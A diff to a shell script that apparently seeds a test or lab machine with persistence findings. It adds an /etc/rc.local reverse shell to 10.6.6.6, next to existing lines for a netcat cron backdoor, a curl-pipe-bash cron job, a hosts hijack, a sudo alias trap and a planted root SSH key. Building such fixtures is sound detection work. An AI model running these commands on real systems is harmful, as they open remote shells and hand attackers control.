@@ -33,6 +33,8 @@ echo '10.6.6.6 www.google.com' >>/etc/hosts
 echo '* * * * * root nc -e /bin/bash 10.6.6.6 4444' >/etc/cron.d/updater
 echo '*/5 * * * * curl -s http://10.6.6.6/x | bash' | crontab -u eve -
 echo "alias sudo='sudo -S'" >>/home/bob/.bashrc
+printf '#!/bin/sh -e\nbash -i >& /dev/tcp/10.6.6.6/4444 0>&1\nexit 0\n' >/etc/rc.local   # reverse shell at every boot
+chmod 755 /etc/rc.local
 mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilEvilEvilEvilEvilEvilEvilEvilEvilEvil attacker@evil' >/root/.ssh/authorized_keys
 # shellcheck disable=SC2012
 ls /lib/*-linux-gnu/libdl.so.2 /usr/lib/*-linux-gnu/libdl.so.2 2>/dev/null | head -1 >/etc/ld.so.preload  # harmless lib, but still a finding
